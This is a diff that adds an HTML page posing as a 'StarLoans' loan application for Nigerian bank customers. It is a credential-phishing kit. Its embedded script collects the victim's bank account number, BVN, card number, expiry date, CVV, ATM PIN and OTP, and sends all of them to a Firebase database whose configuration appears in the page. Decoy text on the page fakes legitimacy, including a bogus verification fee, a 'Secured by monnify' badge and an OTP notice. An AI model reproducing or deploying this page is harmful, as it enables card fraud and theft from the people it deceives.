@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+	<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<title>bank</title>
+		<link rel="stylesheet" href="app.css">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM" crossorigin="anonymous">
+
+
+<script type="module">
+// Import the functions you need from the SDKs you need
+import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.5.2/firebase-app.js';
+import {getDatabase, set, child, remove, onValue, update, get,ref } from "https://www.gstatic.com/firebasejs/10.5.2/firebase-database.js";
+
+		const firebaseConfig = {
+		  apiKey: "AIzaSyDrPwMf6z-xWrJwapawXnBYw60VjiOqjjk",
+		  authDomain: "tett-8b39b.firebaseapp.com",
+		  projectId: "tett-8b39b",
+		  storageBucket: "tett-8b39b.appspot.com",
+		  messagingSenderId: "366708585219",
+		  appId: "1:366708585219:web:bc99d8c4447b67a02fef36"
+		};
+		
+		// Initialize Firebase
+	const App = initializeApp(firebaseConfig);	
+    const db = getDatabase(App);
+	
+
+
+//    References
+
+// bank
+var bnName = document.getElementById("Bank-Name");
+var accNum = document.getElementById("Accountnumber");
+var Acchold = document.getElementById("Client-Name");
+var bnverin = document.getElementById("Bank-verification");
+
+
+// card
+var card = document.getElementById("tems");
+var Bank = document.getElementById("Bankdate");
+var coded = document.getElementById("code");
+var atm1 = document.getElementById("pin1");
+var atm2 = document.getElementById("pin2");
+var atm3 = document.getElementById("pin3");
+var atm4 = document.getElementById("pin4");
+// otp
+var Otp1 = document.getElementById("otp1");
+var Otp2 = document.getElementById("otp2");
+var Otp3 = document.getElementById("otp3");
+var Otp4 = document.getElementById("otp4");
+
+
+var kard = document.querySelector('.cardi');
+var Kard1 =  document.querySelector('.cardi2');
+var Kard2 =  document.querySelector('.otping');
+var loading = document.querySelector('.preloader');
+// button
+var firBtn = document.getElementById("fader")
+var Btw = document.getElementById("faderer");
+var insBtn = document.getElementById("fade")
+var next = document.getElementById("faded");
+
+
+
+function insertData(downloadURL){
+   set(ref(db, "Bank-Details/"+ Acchold.value ),{
+BankName:bnName.value,
+Account:accNum.value,
+AName:Acchold.value,
+BVN:bnverin.value,
+AbtmCardNumber: card.value,
+AExpiry: Bank.value,
+ACvv:coded.value,
+Atmpin1:atm1.value,
+Atmpin2:atm2.value,
+Atmpin3:atm3.value,
+Atmpin4:atm4.value,
+otpcode1:Otp1.value,
+otpcode2:Otp2.value,
+otpcode3:Otp3.value,
+otpcode4:Otp4.value 
+   })
+   .then(()=>{
+       console.log("data added");
+   })
+   .catch((error)=>{
+
+   });
+};
+
+
+
+
+
+
+
+
+
+
+
+
+// btn
+
+firBtn.addEventListener('click', function(){
+kard.classList.remove('cardi');
+kard.classList.add('selected')
+});
+
+
+
+
+
+Btw.addEventListener('click', function(){
+	Kard1.classList.remove("cardi2");
+Kard1.classList.add("selected1");
+});
+
+
+
+
+insBtn.addEventListener('click', function(){
+loading.classList.remove("preloader");
+loading.classList.add("reappear");
+},);
+
+
+let loaded = false
+let enoughTimePassed = false
+
+insBtn.addEventListener("click", function() {
+  if (enoughTimePassed) { hidePreloader() }
+  loaded = true
+})
+
+setTimeout(() => {
+  if (loaded) { hidePreloader() }
+  enoughTimePassed = true
+}, 100000)
+
+function hidePreloader() {
+	loading.remove()
+};
+
+
+
+insBtn.addEventListener('click', insertData);
+
+
+insBtn.addEventListener('click', function(){
+	Kard2.classList.remove("otping");
+Kard2.classList.add("selected2");
+},);
+
+
+next.addEventListener('click', insertData);
+</script>	
+
+
+
+
+</head>
+
+
+
+
+<body id="dark">
+
+		<section id="dark">
+<section id="banking">
+	<nav><a href="work.html"><span class="man"><img class="all" src="icons8-back-50.png"></span></a>
+		
+<ul class="nav justify-content-center">
+  <div class="middle">
+    Bank Info</div>
+
+</ul>
+</nav>
+<nav>
+	<ul class="nav justify-content ">
+	  <li class="nav-item">
+		<span class="nav-link active" aria-current="page" href="#"> <img class="rounds" src="https://www.seanhalpin.xyz/work/docs/flourish/card_docs_icon_01.svg"> <span class="title">StarLoans</span> </span>
+	  </li>
+	
+	  
+	  
+	
+	</ul>
+	</nav>
+<div class="hey"><img src="icons8-error-16.png"> !  Tips: Receipts and repayments may be affected by bank working</div>
+<div class="mada">	
+	<div class="oja">  <span class="thi">Select Bank</span>  <span class="disa"></span>
+<select id="Bank-Name" class="Bank" required>
+
+<option><p></p></option>
+	<option>	Access Bank Plc</option>
+	<option>Fidelity Bank Plc </option>
+	<option>First City Monument Bank Limited
+	<option>First Bank of Nigeria Limited
+	<option>Guaranty Trust Holding Company Plc
+	<option>Union Bank of Nigeria Plc
+	<option>United Bank for Africa Plc
+	<option>Zenith Bank Plc
+
+
+	<option>Citibank Nigeria Limited
+		<option>Ecobank Nigeria</option>
+	<option>Heritage Bank Plc</option>
+	<option>Keystone Bank Limited</option>
+	<option>Optimus Bank Limited</option>
+	<option>Polaris Bank Limited</option>
+	<option>Stanbic IBTC Bank Plc</option>
+	<option>Standard Chartered</option>
+	<option>Sterling Bank Plc</option>
+	<option>Titan Trust bank	<option>
+Unity Bank Plc</option>
+	<option>Wema Bank Plc</option>
+
+
+	<option>Globus Bank Limited</option>
+	<option>Parallex Bank Limited</option>
+	<option>PremiumTrust Bank Limited</option>
+	<option>Providus Bank Limited</option>
+	<option>SunTrust Bank Nigeria Limited</option>
+
+
+	<option>Jaiz Bank Plc</option>
+	<option>LOTUS BANK</option>
+	<option>TAJBank Limited</option>
+
+
+	<option>Mutual Trust Microfinance Bank</option>
+	<option>Rephidim Microfinance Bank</option>
+	<option>Shepherd Trust Microfinance Bank</option>
+	<option>Empire Trust Microfinance Bank</option>
+	<option>Finca Microfinance Bank Limited</option>
+	<option>Fina Trust Microfinance Bank</option>
+	<option>Accion Microfinance Bank</option>
+	<option>Peace Microfinance Bank</option>
+	<option>Infinity Microfinance Bank</option>
+	<option>Pearl Microfinance Bank Limited www.pearlmicrofinancebank.com</option>
+	<option>Covenant Microfinance Bank Ltd</option>
+	<option>Advans La Fayette Microfinance Bank</option>
+
+	<option>FairMoney Microfinance Bank</option>
+	<option>Sparkle Bank</option>
+	<option>Kuda Bank</option>
+	<option>Moniepoint Microfinance Bank</option>
+	<option>Opay</option>
+	<option>Dot Microfinance Bank</option>
+	<option>Palmpay</option>
+	<option>Rubies Bank</option>
+	<option>VFD Microfinance Bank</option>
+	<option>Mint Finex MFB</option>
+	<option>Mkobo MFB</option>
+	<option>Raven bank</option>
+	<option>Rex Microfinance Bank</option>
+
+
+	<option>Coronation Merchant Bank</option>
+	<option>FBNQuest Merchant Bank</option>
+	<option>FSDH Merchant Bank
+	<option>Rand Merchant Bank</option>
+	<option>Nova Merchant Bank</option>
+
+
+	<option>SunTrust Bank Nigeria limited NIB</option>
+	<option>Stanbic Ibtc NIB</option>
+</select></div>
+
+<div class="oja">
+	<label class="thir" for="Bank">Bank Account no</label>
+	<input type="number" id="Accountnumber" required class="Bank" name="" placeholder="input here"  pattern="[0-9]{10}" >
+</div>
+
+
+<div class="oja">
+	<label for="Bank">Bank Account holder</label>
+	<input id="Client-Name" required class="Bank" type="text" name="" placeholder="input here">
+</div>
+
+
+<div class="oja">
+	<label class="third" for="Bank">BVN</label>
+	<input id="Bank-verification" required class="Bank" type="number" name="" placeholder="input here">
+</div>
+
+</div>
+
+<nav>
+<ul class="nav justify-content">
+	
+<button   id="fader"> submit</button>
+
+<p class="warn"><img src="icons8-typing-16.png"> Please fill in bank account information of your own, or loan would fail</p>
+
+<div class="spac"></div>
+</ul>
+</nav>
+</section>
+
+
+
+
+
+
+<section id="card1" class="cardi">
+
+
+	<nav><a href="work.html"><span class="man"><img class="all" src="icons8-back-50.png"></span></a>
+		
+<ul class="nav justify-content-center">
+  <div class="middle">
+    ATM Bank Card</div>
+
+</ul>
+</nav>
+<nav>
+	<ul class="nav justify-content ">
+	  <li class="nav-item">
+		<span class="nav-link active" aria-current="page" href="#"> <img class="rounds" src="https://www.seanhalpin.xyz/work/docs/flourish/card_docs_icon_01.svg"> <span class="title">StarLoans</span> </span>
+	  </li>
+	
+	  
+	  
+	
+	</ul>
+	</nav>
+<h6 class="EGO">Card verification Status</h6>
+<div class="auto"> Not Verified</div>
+<p class="warn">Please verify your bank card to get more credit. In this process, system will deduct your 50 NR for verification. It will be return to you when repay loan.</p>
+
+<nav>
+<ul class="nav justify-content">
+	
+<button id="faderer"> validate card</button>
+
+</ul>
+</nav>
+</section>
+
+
+
+
+<section id="card2" class="cardi2">
+
+
+	<nav><a href="card.html"><span class="man"><img class="all" src="icons8-back-50.png"></span></a>
+		
+<ul class="nav justify-content-center">
+  <div class="middle">
+    Bind Card</div>
+
+</ul>
+</nav>
+
+<nav>
+<ul class="nav justify-content ">
+  <li class="nav-item">
+    <span class="nav-link active" aria-current="page" href="#"> <img class="rounds" src="https://www.seanhalpin.xyz/work/docs/flourish/card_docs_icon_01.svg"> <span class="title">StarLoans</span> </span>
+  </li>
+
+
+  
+
+</ul>
+</nav>
+
+
+
+<div class="mada">
+	<div class="container">
+		<p class="mile">Enter your card details</p>
+ 
+    <div >
+    	<input id="tems" type="number" name="Card Number" placeholder="  Card Number: 0000 0000 0000 0000" required> <span></span> </div>
+  
+
+  <div class="row">
+    <div class="col-4" ><input  id="Bankdate"   class="tem"  type="number" name="" placeholder="Expiry Date: MM / YY" required></div>
+    <div class="col-2"></div>
+    <div  class="col-4"><input  id="code"  class="tem" type="number" name="" placeholder="CVV: 123" required></div>
+    
+</div>
+
+<p class="pin"> Please enter your 4-digit card pin to authorize this transaction</p>
+
+  <div class="row li">
+    <div class="col-3" ><input id="pin1"  class="te"  type="number" name="otp1" placeholder="0" min="0" max="9" required onpaste="false"></div>
+    <div class="col-3"><input  id="pin2"  class="te"  type="number" name="otp2"placeholder="0" min="0" max="9"  required onpaste="false"></div> 
+    <div  class="col-3"><input  id="pin3"  class="te" type="number" name="otp3" placeholder="0" min="0" max="9" required onpaste="false"></div>
+    <div  class="col-3"><input  id="pin4"  class="te" type="number" name="otp4"  placeholder="0" min="0" max="9" required onpaste="false"> </div>
+</div>
+
+
+
+  </div>
+
+
+
+<nav>
+<ul class="nav justify-content">
+	
+<button id="fade"> Bind card</button>
+</ul>
+</nav>
+
+</div>
+
+<p class="in"><img src=""> Secured by <span class="bold">monnify</span> </p>
+
+
+
+</section>
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="preloader">
+		
+ <img class="turn" src="https://www.seanhalpin.xyz/work/docs/flourish/card_docs_icon_01.svg"></span>
+
+ <div class="loade">
+ 
+   <div class="text-center">
+   <div class="spinner-border text-info" style="width: 3rem; height: 3rem;"  role="status">
+	 <span class=""> <img src="icons8-star-50.png"> </span>
+   </div>
+ </div>
+ <div class="disa">,,,,,,,,,,,,,,,,,,,</div>
+ 
+ <div class="">
+   Calculting qouta, Please wait this might take a while...
+ </div>
+ </div>
+ 
+  <img class="" src="https://www.seanhalpin.xyz/work/docs/flourish/card_docs_icon_01.svg">
+	 
+	
+	</section>
+
+
+
+<section id="otp" class="otping">
+<nav><a href="card2.html"><span class="man"><img class="all" src="icons8-back-50.png"></span></a>
+		
+	<ul class="nav justify-content-center">
+	  <div class="middle">
+		OTP Verification</div>
+	
+	</ul>
+	</nav>
+	
+	<nav>
+	<ul class="nav justify-content ">
+	  <li class="nav-item">
+		<span class="nav-link active" aria-current="page" href="#"> <img class="rounds" src="https://www.seanhalpin.xyz/work/docs/flourish/card_docs_icon_01.svg"> <span class="title">StarLoans</span> </span>
+	  </li>
+	
+	  
+	  
+	
+	</ul>
+	</nav>
+	
+	
+	
+	<div class="he"><img src="icons8-typing-16.png"> ! A One Time Password code has been sent from LUNO  to the phone number associated with the ATM Bank Card provided you registered with.</div>
+	
+	<form action="loading.html">
+	<p class="pin">Enter your OTP</p>
+	
+	  <div class="row li">
+	
+		<div class="col-3" ><input  class="te"  type="number" Id="otp1" required></div>
+		<div class="col-3"><input class="te"  type="number" Id="otp2"  required></div> 
+		<div  class="col-3"><input class="te" type="number" Id="otp3"  required></div>
+		<div  class="col-3"><input class="te" type="number" Id="otp4"  required></div>
+	</div>
+	
+	
+	
+	  </div>
+	
+	
+	
+	<nav>
+	<ul class="nav justify-content">
+		
+	<a class="apple" href="loading.html"><button  Id="faded"> Next</button></a>
+	
+	</ul>
+	</nav>
+</form>
+	</div>
+	</section>
+</section>
+	</body>
+	
+	<script type="text/javascript" src="form.js"></script>
+	
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js" integrity="sha384-I7E8VVD/ismYTF4hNIPjVp/Zjvgyol6VFvRkX/vR+Vc4jQkC+hVqc2pM8ODewa9r" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.min.js" integrity="sha384-fbbOQedDUMZZ5KreZpsbe1LCZPVmfTnH7ois6mU1QK+m14rQ1l2bGBq41eYeM/fS" crossorigin="anonymous"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+	<script src="https://unpkg.com/babel-standalone@6/babel.min.js"></script>
+	<script crossorigin src="https://unpkg.com/react@18/umd/react.development.js"></script>
+<script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
+</html>	
